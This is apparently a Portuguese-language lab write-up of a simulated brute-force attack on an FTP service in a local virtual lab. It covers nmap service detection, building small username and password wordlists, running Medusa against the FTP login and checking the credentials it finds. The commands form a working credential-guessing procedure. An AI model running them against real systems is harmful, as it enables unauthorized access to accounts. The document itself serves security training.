# Ataque ao Serviço FTP com Medusa

Este arquivo documenta o passo a passo realizado para simular um ataque de força bruta ao serviço FTP utilizando o Kali Linux e a ferramenta Medusa.

---

## 1. Identificando o Serviço FTP

Sabendo que o serviço FTP opera normalmente na porta **21**, verificamos sua presença e detalhes no host alvo utilizando o comando:

```bash
sudo nmap -v -sS -sV -T5 -p 21 192.168.56.101
```

**Imagem: detalhes_porta_FTP.png**

---

## 2. Confirmando o Funcionamento do Serviço FTP

Para garantir que o serviço FTP está ativo e aceitando conexões, utilizamos:

```bash
ftp 192.168.56.101
```

O serviço conectou e solicitou login.

**Imagem: servico_ftp_ativo.png**

---

## 3. Criando Worklists de Usuários e Senhas

Criamos arquivos contendo usuários e senhas possíveis para serem testados pelo Medusa:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

**Imagem: worklist_user.png**

Verificando os arquivos criados:

```bash
cat users.txt
cat pass.txt
```

**Imagem: arquivos_criados.png**

---

## 4. Executando o Ataque Brute Force com o Medusa

Utilizamos o Medusa para tentar combinações de usuário e senha definidos nas worklists:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

Este comando realiza múltiplas tentativas e exibe resultados válidos e inválidos.

**Imagem: user_success.png**

---

## 5. Validando Credenciais Descobertas

Uma vez encontrada uma combinação válida pelo Medusa, realizamos o login manualmente:

```bash
ftp 192.168.56.101
```

Digitamos o usuário e senha revelados e confirmamos o sucesso no acesso.

**Imagem: login_ftp_success.png**

---

## 6. Conclusão

Simulamos com sucesso um ataque de força bruta ao serviço FTP utilizando o Medusa, confirmando o funcionamento do ataque e validando credenciais encontradas.
